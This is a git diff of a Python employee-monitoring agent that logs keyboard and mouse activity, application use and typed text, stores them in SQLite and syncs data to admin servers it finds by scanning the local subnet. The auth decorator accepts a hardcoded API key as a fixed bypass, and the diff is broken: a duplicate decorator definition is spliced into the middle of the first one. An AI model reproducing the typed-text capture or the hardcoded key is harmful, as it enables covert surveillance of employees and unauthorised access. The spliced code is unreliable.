@@ -32,6 +32,8 @@ import wmi
 import uuid
 import time
 import logging
+import ipaddress
+from urllib.parse import urlparse
 
 
 
@@ -93,14 +95,29 @@ def require_api_key(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
         api_key = request.headers.get('X-API-Key')
+# ============================================================
+# MISSING IMPORTS AND HELPER FUNCTIONS
+# ============================================================
+
+def require_api_key(f):
+    """API key authentication decorator"""
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        api_key = request.headers.get('X-API-Key')
         # Check against hardcoded OR generated key
         if api_key == "8f42v73054r1749f8g58848be5e6502c" or api_key == API_KEY:
             return f(*args, **kwargs)
         return jsonify({"error": "Invalid API key"}), 401
     return decorated_function
 
+_CACHED_MAC = None
+
 def get_mac_address():
-    """Get MAC address on Windows using WMI"""
+    """Get MAC address on Windows using WMI (Cached)"""
+    global _CACHED_MAC
+    if _CACHED_MAC:
+        return _CACHED_MAC
+        
     try:
         c = wmi.WMI()
         # Get first active network adapter with MAC
@@ -108,39 +125,61 @@ def get_mac_address():
             if interface.MACAddress:
                 mac = interface.MACAddress.strip()
                 if mac and mac != '00:00:00:00:00:00':
-                    return mac.upper()  # Return in uppercase for consistency
+                    _CACHED_MAC = mac.upper()  # Return in uppercase for consistency
+                    return _CACHED_MAC
     except:
         pass
     
     # Fallback to uuid method
-    return ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) 
+    _CACHED_MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) 
                     for i in range(0, 48, 8)][::-1])
+    return _CACHED_MAC
+
+_CACHED_IP = None
+_CACHED_IP_TIME = 0
+
 def get_local_ip():
-    """Get local IP address with priority for 172.16.2.x subnet"""
+    """Get local IP address with priority for 172.16.2.x subnet (Cached with 5 min TTL)"""
+    global _CACHED_IP, _CACHED_IP_TIME
+    now = time.time()
+    if _CACHED_IP and (now - _CACHED_IP_TIME < 300):
+        return _CACHED_IP
+        
     try:
         # First try to find the specific subnet
         for interface, addrs in psutil.net_if_addrs().items():
             for addr in addrs:
                 if addr.family == socket.AF_INET:
                     if addr.address.startswith("172.16.2."):
-                        return addr.address
+                        _CACHED_IP = addr.address
+                        return _CACHED_IP
         
         # Fallback to standard method
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
         s.close()
-        return ip
+        _CACHED_IP = ip
+        _CACHED_IP_TIME = time.time()
+        return _CACHED_IP
     except:
-        return "127.0.0.1"
+        _CACHED_IP = "127.0.0.1"
+        _CACHED_IP_TIME = time.time()
+        return _CACHED_IP
+
+_CACHED_HOSTNAME = None
 
 def get_exact_hostname():
     """
-    Returns the most accurate hostname across platforms with fallback mechanism:
+    Returns the most accurate hostname across platforms with fallback mechanism (Cached):
     - Windows: FQDN if domain joined, otherwise computer name (via WMI)
     - Linux/macOS: FQDN from socket.getfqdn() or hostname command
     - Universal fallback: socket.gethostname()
     """
+    global _CACHED_HOSTNAME
+    if _CACHED_HOSTNAME:
+        return _CACHED_HOSTNAME
+        
     system = platform.system()
     
     try:
@@ -155,11 +194,13 @@ def get_exact_hostname():
                 if comp_system.PartOfDomain and comp_system.Domain:
                     fqdn = f"{hostname}.{comp_system.Domain}".lower()
                     print(f"✓ Detected domain-joined hostname: {fqdn}")
-                    return fqdn
+                    _CACHED_HOSTNAME = fqdn
+                    return _CACHED_HOSTNAME
                 
                 # Not domain joined, return computer name
                 print(f"✓ Detected standalone hostname: {hostname.lower()}")
-                return hostname.lower()
+                _CACHED_HOSTNAME = hostname.lower()
+                return _CACHED_HOSTNAME
                 
             except Exception as wmi_error:
                 print(f"⚠ WMI hostname detection failed: {wmi_error}, using fallback")
@@ -174,12 +215,14 @@ def get_exact_hostname():
                 # Validate FQDN (should contain domain and not be localhost)
                 if '.' in fqdn and not fqdn.startswith('localhost'):
                     print(f"✓ Detected FQDN: {fqdn}")
-                    return fqdn.lower()
+                    _CACHED_HOSTNAME = fqdn.lower()
+                    return _CACHED_HOSTNAME
                 
                 # FQDN not valid, try short hostname
                 hostname = socket.gethostname()
                 print(f"✓ Detected hostname: {hostname}")
-                return hostname.lower()
+                _CACHED_HOSTNAME = hostname.lower()
+                return _CACHED_HOSTNAME
                 
             except Exception as socket_error:
                 print(f"⚠ Socket hostname detection failed: {socket_error}")
@@ -191,7 +234,8 @@ def get_exact_hostname():
                             hostname = f.read().strip()
                             if hostname:
                                 print(f"✓ Read hostname from /etc/hostname: {hostname}")
-                                return hostname.lower()
+                                _CACHED_HOSTNAME = hostname.lower()
+                                return _CACHED_HOSTNAME
                     except:
                         pass
                 
@@ -200,14 +244,16 @@ def get_exact_hostname():
                     hostname = os.environ.get(env_var)
                     if hostname:
                         print(f"✓ Got hostname from {env_var}: {hostname}")
-                        return hostname.lower()
+                        _CACHED_HOSTNAME = hostname.lower()
+                        return _CACHED_HOSTNAME
                 
                 raise  # Re-raise to trigger universal fallback
         
         else:
             # Unknown platform, use socket method
             print(f"⚠ Unknown platform '{system}', using socket fallback")
-            return socket.gethostname().lower()
+            _CACHED_HOSTNAME = socket.gethostname().lower()
+            return _CACHED_HOSTNAME
             
     except Exception as e:
         # Universal fallback for all errors
@@ -215,11 +261,13 @@ def get_exact_hostname():
         try:
             fallback = socket.gethostname().lower()
             print(f"→ Using universal fallback: {fallback}")
-            return fallback
+            _CACHED_HOSTNAME = fallback
+            return _CACHED_HOSTNAME
         except:
             # Absolute last resort
             print("→ Using hardcoded fallback: 'unknown-host'")
-            return "unknown-host"
+            _CACHED_HOSTNAME = "unknown-host"
+            return _CACHED_HOSTNAME
 
 
 def get_system_info():
@@ -240,9 +288,6 @@ def get_system_info():
 def register_or_update_employee():
     """Register or update employee device in database"""
     try:
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        
         mac = get_mac_address()
         ip = get_local_ip()
         hostname = get_exact_hostname()
@@ -251,14 +296,15 @@ def register_or_update_employee():
         # Encrypt system info
         encrypted_system_info = encrypt_data(json.dumps(system_info))
         
-        cursor.execute('''
-            INSERT OR REPLACE INTO employee_details 
-            (employee_name, mac_address, ip_address, hostname, system_info_encrypted, last_seen, is_active)
-            VALUES (?, ?, ?, ?, ?, datetime('now'), 1)
-        ''', (f"Employee_{hostname}", mac, ip, hostname, encrypted_system_info))
-        
-        conn.commit()
-        conn.close()
+        with db_lock:
+            cursor = db_conn.cursor()
+            cursor.execute('''
+                INSERT OR REPLACE INTO employee_details 
+                (employee_name, mac_address, ip_address, hostname, system_info_encrypted, last_seen, is_active)
+                VALUES (?, ?, ?, ?, ?, datetime('now'), 1)
+            ''', (f"Employee_{hostname}", mac, ip, hostname, encrypted_system_info))
+            
+            db_conn.commit()
         print(f"✓ Device registered: {hostname} ({mac})")
         
     except Exception as e:
@@ -277,8 +323,11 @@ def get_live_stats():
     current_time = time.time()
     idle_time = current_time - activity_metrics['system']['last_activity']
     
-    # Get network metrics
-    net_metrics = network_monitor.get_network_metrics()
+    with current_stats_lock:
+        core_stats = current_secure_stats.get('core', {})
+        cpu = core_stats.get('cpu_percent', 0.0) if core_stats else 0.0
+        memory = core_stats.get('memory_percent', 0.0) if core_stats else 0.0
+        net_stats = current_secure_stats.get('network', {})
 
     return jsonify({
         "timestamp": datetime.now().isoformat(),
@@ -289,11 +338,11 @@ def get_live_stats():
             "total_active_today": activity_metrics['system']['total_duration']
         },
         "system": {
-            "cpu": psutil.cpu_percent(interval=0.1),
-            "memory": psutil.virtual_memory().percent,
+            "cpu": cpu,
+            "memory": memory,
             "current_app": system_monitor.current_app
         },
-        "network": net_metrics
+        "network": net_stats
     })
 
 # ============================================================
@@ -340,111 +389,121 @@ else:
 DB_PATH = os.path.join(BASE_DIR, 'secure_employee_monitor.db')
 
 # ============================================================
-# ENHANCED DATABASE WITH ENCRYPTION
+# ENHANCED DATABASE WITH ENCRYPTION & WAL
 # ============================================================
+
+db_lock = threading.Lock()
+db_conn = sqlite3.connect(DB_PATH, check_same_thread=False)
+db_conn.execute("PRAGMA journal_mode=WAL;")
+db_conn.execute("PRAGMA synchronous=NORMAL;")
+db_conn.execute("PRAGMA temp_store=MEMORY;")
+db_conn.execute("PRAGMA cache_size=-20000;")  # ~20MB cache
+db_conn.commit()
 
 def init_secure_database():
     """Initialize encrypted database"""
-    conn = sqlite3.connect(DB_PATH)
-    cursor = conn.cursor()
-    
-    # Employee details with encryption
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS employee_details (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            employee_name TEXT,
-            mac_address TEXT UNIQUE,
-            ip_address TEXT,
-            hostname TEXT,
-            system_info_encrypted TEXT,
-            first_installed TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            is_active BOOLEAN DEFAULT 1
-        )
-    ''')
-    
-    # Enhanced daily summary
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS daily_summary (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            date DATE,
-            mac_address TEXT,
-            total_active_seconds REAL,
-            keyboard_active_seconds REAL,
-            mouse_active_seconds REAL,
-            screen_on_seconds REAL,
-            keyboard_events_count INTEGER,
-            mouse_events_count INTEGER,
-            typed_characters_count INTEGER,
-            sessions_count INTEGER,
-            applications_used TEXT,
-            first_activity TIMESTAMP,
-            last_activity TIMESTAMP,
-            avg_cpu_usage REAL,
-            avg_memory_usage REAL,
-            max_cpu_usage REAL,
-            max_memory_usage REAL,
-            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-            UNIQUE(date, mac_address)
-        )
-    ''')
-    
-    # Hourly breakdown for detailed analysis
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS hourly_activity (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            date DATE,
-            mac_address TEXT,
-            hour INTEGER,
-            keyboard_events INTEGER DEFAULT 0,
-            mouse_events INTEGER DEFAULT 0,
-            active_seconds INTEGER DEFAULT 0,
-            cpu_avg REAL,
-            memory_avg REAL
-        )
-    ''')
-    
-    # Application usage tracking
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS application_usage (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            date DATE,
-            mac_address TEXT,
-            application_name TEXT,
-            usage_seconds INTEGER,
-            window_title TEXT,
-            start_time TIMESTAMP,
-            end_time TIMESTAMP
-        )
-    ''')
-    
-    # Encrypted typed text
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS encrypted_typed_data (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            date DATE,
-            mac_address TEXT,
-            encrypted_text TEXT,
-            character_count INTEGER,
-            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-        )
-    ''')
-    
-    # System alerts and events
-    cursor.execute('''
-        CREATE TABLE IF NOT EXISTS system_alerts (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            date DATE,
-            mac_address TEXT,
-            alert_type TEXT,
-            alert_message TEXT,
-            severity TEXT,
-            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-        )
-    ''')
-    
-    conn.commit()
-    conn.close()
+    with db_lock:
+        cursor = db_conn.cursor()
+        
+        # Employee details with encryption
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS employee_details (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                employee_name TEXT,
+                mac_address TEXT UNIQUE,
+                ip_address TEXT,
+                hostname TEXT,
+                system_info_encrypted TEXT,
+                first_installed TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                is_active BOOLEAN DEFAULT 1
+            )
+        ''')
+        
+        # Enhanced daily summary
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS daily_summary (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                date DATE,
+                mac_address TEXT,
+                total_active_seconds REAL,
+                keyboard_active_seconds REAL,
+                mouse_active_seconds REAL,
+                screen_on_seconds REAL,
+                keyboard_events_count INTEGER,
+                mouse_events_count INTEGER,
+                typed_characters_count INTEGER,
+                sessions_count INTEGER,
+                applications_used TEXT,
+                first_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                avg_cpu_usage REAL,
+                avg_memory_usage REAL,
+                max_cpu_usage REAL,
+                max_memory_usage REAL
+            )
+        ''')
+        
+        # Enhanced hourly breakdown
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS hourly_activity (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                date DATE,
+                mac_address TEXT,
+                hour INTEGER,
+                keyboard_events INTEGER DEFAULT 0,
+                mouse_events INTEGER DEFAULT 0,
+                active_seconds INTEGER DEFAULT 0,
+                cpu_avg REAL,
+                memory_avg REAL,
+                UNIQUE(date, mac_address, hour)
+            )
+        ''')
+        
+        # Add indexes for frequent queries
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_daily_date_mac ON daily_summary (date, mac_address);')
+        cursor.execute('CREATE INDEX IF NOT EXISTS idx_hourly_date_mac ON hourly_activity (date, mac_address);')
+        
+        # Application usage tracking
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS application_usage (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                date DATE,
+                mac_address TEXT,
+                application_name TEXT,
+                usage_seconds INTEGER,
+                window_title TEXT,
+                start_time TIMESTAMP,
+                end_time TIMESTAMP
+            )
+        ''')
+        
+        # Encrypted typed text
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS encrypted_typed_data (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                date DATE,
+                mac_address TEXT,
+                encrypted_text TEXT,
+                character_count INTEGER,
+                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        
+        # System alerts and events
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS system_alerts (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                date DATE,
+                mac_address TEXT,
+                alert_type TEXT,
+                alert_message TEXT,
+                severity TEXT,
+                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        
+        db_conn.commit()
     print("✓ Secure database initialized")
 
 def encrypt_data(data):
@@ -505,21 +564,19 @@ class SystemMonitor:
         """Save application usage to database"""
         if self.app_usage:
             try:
-                conn = sqlite3.connect(DB_PATH)
-                cursor = conn.cursor()
-                
                 today = date.today().isoformat()
                 mac = get_mac_address()
                 
-                for app_name, usage_seconds in self.app_usage.items():
-                    cursor.execute('''
-                        INSERT INTO application_usage 
-                        (date, mac_address, application_name, usage_seconds, start_time, end_time)
-                        VALUES (?, ?, ?, ?, datetime('now', '-' || ? || ' seconds'), datetime('now'))
-                    ''', (today, mac, app_name, usage_seconds, usage_seconds))
-                
-                conn.commit()
-                conn.close()
+                with db_lock:
+                    cursor = db_conn.cursor()
+                    for app_name, usage_seconds in self.app_usage.items():
+                        cursor.execute('''
+                            INSERT INTO application_usage 
+                            (date, mac_address, application_name, usage_seconds, start_time, end_time)
+                            VALUES (?, ?, ?, ?, datetime('now', '-' || ? || ' seconds'), datetime('now'))
+                        ''', (today, mac, app_name, usage_seconds, usage_seconds))
+                    
+                    db_conn.commit()
                 self.app_usage.clear()
                 
             except Exception as e:
@@ -554,45 +611,41 @@ def update_enhanced_activity_times(delta=1.0):
     # Track application usage
     system_monitor.track_application_usage()
     
-    # Save data every 30 seconds
-    if int(current_time) % 30 == 0:
+    # Save data every 5 minutes (300 seconds) vs 30 seconds
+    if int(current_time) % 300 == 0:
         save_enhanced_activity_snapshot()
         save_daily_summary_enhanced()
-    
-    # Save application usage every 5 minutes
-    if int(current_time) % 300 == 0:
         system_monitor.save_application_usage()
         save_encrypted_typed_text()
 
 def save_enhanced_activity_snapshot():
     """Save enhanced activity snapshot"""
     try:
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        
         current_time = time.time()
         kb_active = 1 if (current_time - activity_metrics['keyboard']['last_activity']) < INACTIVITY_THRESHOLD else 0
         mouse_active = 1 if (current_time - activity_metrics['mouse']['last_activity']) < INACTIVITY_THRESHOLD else 0
         
-        cpu = psutil.cpu_percent(interval=0.1)
-        memory = psutil.virtual_memory().percent
-        
-        # Save to hourly breakdown
+        with current_stats_lock:
+            core_stats = current_secure_stats.get('core', {})
+            cpu = core_stats.get('cpu_percent', 0.0) if core_stats else 0.0
+            memory = core_stats.get('memory_percent', 0.0) if core_stats else 0.0
+            
         current_hour = datetime.now().hour
         today = date.today().isoformat()
         mac = get_mac_address()
         
-        cursor.execute('''
-            INSERT OR REPLACE INTO hourly_activity 
-            (date, mac_address, hour, keyboard_events, mouse_events, active_seconds, cpu_avg, memory_avg)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-        ''', (today, mac, current_hour, 
-              activity_metrics['keyboard']['count'], 
-              activity_metrics['mouse']['count'],
-              1, cpu, memory))
-        
-        conn.commit()
-        conn.close()
+        with db_lock:
+            cursor = db_conn.cursor()
+            cursor.execute('''
+                INSERT OR REPLACE INTO hourly_activity 
+                (date, mac_address, hour, keyboard_events, mouse_events, active_seconds, cpu_avg, memory_avg)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (today, mac, current_hour, 
+                  activity_metrics['keyboard']['count'], 
+                  activity_metrics['mouse']['count'],
+                  1, cpu, memory))
+            
+            db_conn.commit()
         
     except Exception as e:
         print(f"Enhanced activity snapshot error: {e}")
@@ -600,41 +653,39 @@ def save_enhanced_activity_snapshot():
 def save_daily_summary_enhanced():
     """Enhanced daily summary with more metrics"""
     try:
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        
         today = date.today().isoformat()
         mac = get_mac_address()
         
-        # Get system metrics
-        cpu = psutil.cpu_percent(interval=0.1)
-        memory = psutil.virtual_memory().percent
+        with current_stats_lock:
+            core_stats = current_secure_stats.get('core', {})
+            cpu = core_stats.get('cpu_percent', 0.0) if core_stats else 0.0
+            memory = core_stats.get('memory_percent', 0.0) if core_stats else 0.0
         
-        # Applications used
         apps_used = json.dumps(list(system_monitor.app_usage.keys()))
         
-        cursor.execute('''
-            INSERT OR REPLACE INTO daily_summary 
-            (date, mac_address, total_active_seconds, keyboard_active_seconds, 
-             mouse_active_seconds, screen_on_seconds, keyboard_events_count, 
-             mouse_events_count, typed_characters_count, sessions_count,
-             applications_used, first_activity, last_activity, 
-             avg_cpu_usage, avg_memory_usage, max_cpu_usage, max_memory_usage)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, 
-                    datetime('now'), datetime('now'), ?, ?, ?, ?)
-        ''', (today, mac, 
-              activity_metrics['system']['total_duration'],
-              activity_metrics['keyboard']['duration'],
-              activity_metrics['mouse']['duration'],
-              activity_metrics['system']['total_duration'],  # Screen time same as active time
-              activity_metrics['keyboard']['count'],
-              activity_metrics['mouse']['count'],
-              len(typed_text),
-              apps_used,
-              cpu, memory, cpu, memory))
-        
-        conn.commit()
-        conn.close()
+        with db_lock:
+            cursor = db_conn.cursor()
+            cursor.execute('''
+                INSERT OR REPLACE INTO daily_summary 
+                (date, mac_address, total_active_seconds, keyboard_active_seconds, 
+                 mouse_active_seconds, screen_on_seconds, keyboard_events_count, 
+                 mouse_events_count, typed_characters_count, sessions_count,
+                 applications_used, first_activity, last_activity, 
+                 avg_cpu_usage, avg_memory_usage, max_cpu_usage, max_memory_usage)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, 
+                        datetime('now'), datetime('now'), ?, ?, ?, ?)
+            ''', (today, mac, 
+                  activity_metrics['system']['total_duration'],
+                  activity_metrics['keyboard']['duration'],
+                  activity_metrics['mouse']['duration'],
+                  activity_metrics['system']['total_duration'],
+                  activity_metrics['keyboard']['count'],
+                  activity_metrics['mouse']['count'],
+                  len(typed_text),
+                  apps_used,
+                  cpu, memory, cpu, memory))
+            
+            db_conn.commit()
         
     except Exception as e:
         print(f"Enhanced daily summary error: {e}")
@@ -642,20 +693,20 @@ def save_daily_summary_enhanced():
 def load_daily_stats():
     """Load daily stats from database"""
     try:
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        
         today = date.today().isoformat()
         mac = get_mac_address()
         
-        cursor.execute('''
-            SELECT total_active_seconds, keyboard_active_seconds, mouse_active_seconds,
-                   keyboard_events_count, mouse_events_count
-            FROM daily_summary 
-            WHERE date = ? AND mac_address = ?
-        ''', (today, mac))
-        
-        row = cursor.fetchone()
+        with db_lock:
+            cursor = db_conn.cursor()
+            cursor.execute('''
+                SELECT total_active_seconds, keyboard_active_seconds, mouse_active_seconds,
+                       keyboard_events_count, mouse_events_count
+                FROM daily_summary 
+                WHERE date = ? AND mac_address = ?
+            ''', (today, mac))
+            
+            row = cursor.fetchone()
+            
         if row:
             activity_metrics['system']['total_duration'] = row[0]
             activity_metrics['keyboard']['duration'] = row[1]
@@ -664,7 +715,6 @@ def load_daily_stats():
             activity_metrics['mouse']['count'] = row[4]
             print(f"✓ Loaded daily stats: {round(row[0]/60, 1)} min active")
             
-        conn.close()
     except Exception as e:
         print(f"Error loading daily stats: {e}")
 
@@ -678,21 +728,18 @@ def save_encrypted_typed_text():
 
     try:
         encrypted_text = encrypt_data(text_chunk)
-        
-        conn = sqlite3.connect(DB_PATH)
-        cursor = conn.cursor()
-        
         today = date.today().isoformat()
         mac = get_mac_address()
         
-        cursor.execute('''
-            INSERT INTO encrypted_typed_data 
-            (date, mac_address, encrypted_text, character_count)
-            VALUES (?, ?, ?, ?)
-        ''', (today, mac, encrypted_text, len(text_chunk)))
-        
-        conn.commit()
-        conn.close()
+        with db_lock:
+            cursor = db_conn.cursor()
+            cursor.execute('''
+                INSERT INTO encrypted_typed_data 
+                (date, mac_address, encrypted_text, character_count)
+                VALUES (?, ?, ?, ?)
+            ''', (today, mac, encrypted_text, len(text_chunk)))
+            
+            db_conn.commit()
             
     except Exception as e:
         print(f"Encrypted text save error: {e}")
@@ -728,10 +775,18 @@ def on_click_enhanced(x, y, button, pressed):
         activity_metrics['mouse']['count'] += 1
         activity_metrics['system']['last_activity'] = time.time()
 
+_last_mouse_update = 0
+
 def on_move_enhanced(x, y):
     """Enhanced mouse movement"""
-    activity_metrics['mouse']['last_activity'] = time.time()
-    activity_metrics['system']['last_activity'] = time.time()
+    global _last_mouse_update
+    now = time.time()
+    if now - _last_mouse_update < 0.1:
+        return
+    _last_mouse_update = now
+    
+    activity_metrics['mouse']['last_activity'] = now
+    activity_metrics['system']['last_activity'] = now
 
 # ============================================================
 # AUTO-DISCOVERY AND SYNC SERVICE
@@ -740,94 +795,219 @@ def on_move_enhanced(x, y):
 class AutoDiscoveryService:
     def __init__(self):
         self.admin_servers = []
-        self.sync_interval = 1800  # 30 minutes
-    
-    def discover_admin_servers(self, network_range="172.16.2.0/24"):
-        """Discover admin servers in network"""
-        discovered_servers = []
-        
-        def check_admin_server(ip, port=5000):
-            try:
-                response = requests.get(f"http://{ip}:{port}/api/tracking/register", 
-                                      timeout=5,
-                                      headers={'X-API-Key': API_KEY})
-                if response.status_code == 200:
-                    discovered_servers.append({
-                        'ip': ip,
-                        'port': port,
-                        'name': response.json().get('server_name', 'Unknown')
-                    })
-            except:
-                pass
-        
-        # Scan network using local IP range
-        local_ip = get_local_ip()
-        # Extract base (first 3 octets) from local IP
-        ip_parts = local_ip.split('.')
-        if len(ip_parts) == 4:
-            base_ip = '.'.join(ip_parts[:3]) + '.'
+        self.sync_interval = int(os.getenv('ADMIN_SYNC_INTERVAL_SECONDS', '1800') or '1800')
+        self.admin_server_url = self._normalize_admin_url(os.getenv('ADMIN_SERVER_URL'))
+        self.admin_ports = self._parse_admin_ports(os.getenv('ADMIN_SERVER_PORTS', '5001,5000'))
+        self.discovery_subnet = (os.getenv('ADMIN_DISCOVERY_SUBNET') or '').strip() or None
+
+        discovery_enabled_raw = os.getenv('ADMIN_DISCOVERY_ENABLED')
+        if discovery_enabled_raw is None:
+            self.discovery_enabled = not bool(self.admin_server_url)
         else:
-            base_ip = "172.16.2."  # Fallback
-        
-        print(f"Scanning range: {base_ip}*")
-        
-        with ThreadPoolExecutor(max_workers=50) as executor:
-            for i in range(1, 255):
-                ip = base_ip + str(i)
-                executor.submit(check_admin_server, ip)
-        
-        return discovered_servers
+            self.discovery_enabled = discovery_enabled_raw.strip().lower() in ('1', 'true', 'yes', 'on')
+
+        self.last_discovery_reason = 'not_started'
+        self._last_no_server_log = 0
+        self.no_server_log_interval = int(os.getenv('ADMIN_DISCOVERY_LOG_INTERVAL_SECONDS', '300') or '300')
+
+    def _normalize_admin_url(self, raw_url):
+        if not raw_url:
+            return None
+        value = str(raw_url).strip()
+        if not value:
+            return None
+        if '://' not in value:
+            value = f"http://{value}"
+        parsed = urlparse(value)
+        if not parsed.netloc:
+            return None
+        scheme = parsed.scheme or 'http'
+        return f"{scheme}://{parsed.netloc}".rstrip('/')
+
+    def _parse_admin_ports(self, raw_ports):
+        ports = []
+        for raw_part in str(raw_ports or '').split(','):
+            part = raw_part.strip()
+            if not part:
+                continue
+            try:
+                port = int(part)
+            except ValueError:
+                continue
+            if 1 <= port <= 65535 and port not in ports:
+                ports.append(port)
+        return ports or [5001, 5000]
+
+    def _probe_admin_server(self, base_url, source='discovery'):
+        target = f"{base_url.rstrip('/')}/api/tracking/register"
+        try:
+            response = requests.get(
+                target,
+                timeout=2,
+                headers={'X-API-Key': API_KEY},
+            )
+            if response.status_code != 200:
+                return None
+            payload = {}
+            if (response.headers.get('content-type') or '').lower().startswith('application/json'):
+                payload = response.json()
+            parsed = urlparse(base_url)
+            return {
+                'ip': parsed.hostname,
+                'port': parsed.port,
+                'name': payload.get('server_name', 'Unknown'),
+                'base_url': base_url.rstrip('/'),
+                'source': source,
+            }
+        except Exception:
+            return None
+
+    def _probe_admin_ip_port(self, ip, port):
+        return self._probe_admin_server(f"http://{ip}:{port}", source='subnet-scan')
+
+    def _build_scan_candidates(self, network_range=None):
+        configured_range = (network_range or self.discovery_subnet or '').strip()
+        if configured_range:
+            try:
+                network = ipaddress.ip_network(configured_range, strict=False)
+                return [str(ip) for ip in network.hosts()], configured_range
+            except Exception:
+                pass
+
+        local_ip = get_local_ip()
+        ip_parts = local_ip.split('.')
+        if len(ip_parts) != 4:
+            return [], 'none'
+        base_ip = '.'.join(ip_parts[:3]) + '.'
+        return [f"{base_ip}{index}" for index in range(1, 255)], f"{base_ip}*"
+
+    def _log_no_admin_servers(self, reason):
+        now = time.time()
+        if now - self._last_no_server_log >= self.no_server_log_interval:
+            print(f"[AutoSync] No admin servers found ({reason}). Next retry in {self.sync_interval}s.")
+            self._last_no_server_log = now
+    
+    def discover_admin_servers(self, network_range=None):
+        """Discover admin servers using explicit target first, then optional subnet scan."""
+        discovered_servers = []
+
+        if self.admin_server_url:
+            explicit_server = self._probe_admin_server(self.admin_server_url, source='explicit-url')
+            if explicit_server:
+                self.last_discovery_reason = f"explicit target reachable ({self.admin_server_url})"
+                return [explicit_server]
+            self.last_discovery_reason = f"explicit target unreachable ({self.admin_server_url})"
+            if not self.discovery_enabled:
+                return []
+
+        if not self.discovery_enabled:
+            self.last_discovery_reason = 'subnet discovery disabled'
+            return []
+
+        candidates, range_label = self._build_scan_candidates(network_range=network_range)
+        if not candidates:
+            self.last_discovery_reason = 'no valid subnet candidates'
+            return []
+
+        print(f"[AutoSync] Scanning range {range_label} on ports {','.join(str(port) for port in self.admin_ports)}")
+
+        max_threads = min(20, len(candidates)) if candidates else 1
+        with ThreadPoolExecutor(max_workers=max_threads) as executor:
+            futures = []
+            for ip in candidates:
+                for port in self.admin_ports:
+                    futures.append(executor.submit(self._probe_admin_ip_port, ip, port))
+
+            for future in futures:
+                server = future.result()
+                if server:
+                    discovered_servers.append(server)
+                    # Early exit if we have found enough admin servers (e.g. 2)
+                    if len(discovered_servers) >= 2:
+                        break
+
+        deduped_servers = []
+        seen_base_urls = set()
+        for server in discovered_servers:
+            base_url = server.get('base_url')
+            if not base_url or base_url in seen_base_urls:
+                continue
+            seen_base_urls.add(base_url)
+            deduped_servers.append(server)
+
+        if deduped_servers:
+            self.last_discovery_reason = 'discovered via subnet scan'
+            return deduped_servers
+
+        self.last_discovery_reason = f"no response in {range_label} on ports {','.join(str(port) for port in self.admin_ports)}"
+        return []
     
     def sync_with_admin(self, admin_server):
         """Sync data with admin server"""
         try:
-            # Prepare sync data
+            base_url = admin_server.get('base_url')
+            if not base_url:
+                ip = admin_server.get('ip')
+                port = admin_server.get('port')
+                if not ip or not port:
+                    return False
+                base_url = f"http://{ip}:{port}"
+
             sync_data = {
                 'mac_address': get_mac_address(),
-                'hostname': socket.gethostname(),
+                'hostname': get_exact_hostname(),
                 'ip_address': get_local_ip(),
-                'system_info': get_system_info(),
+                'unique_client_id': get_persistent_client_id(),
                 'current_stats': get_live_stats().get_json(),
                 'api_key': API_KEY
+                # Omitted `system_info` to dramatically shrink sync payloads per user feedback
             }
-            
+
             response = requests.post(
-                f"http://{admin_server['ip']}:{admin_server['port']}/api/tracking/sync",
+                f"{base_url.rstrip('/')}/api/tracking/sync",
                 json=sync_data,
-                timeout=10
+                timeout=10,
+                headers={'X-API-Key': API_KEY}
             )
-            
+
             if response.status_code == 200:
-                print(f"✓ Synced with admin server: {admin_server['name']}")
+                print(f"[AutoSync] Synced with admin server: {admin_server.get('name', base_url)}")
                 return True
-            else:
-                print(f"✗ Sync failed with: {admin_server['name']}")
-                return False
-                
-        except Exception as e:
-            print(f"Sync error: {e}")
+            print(
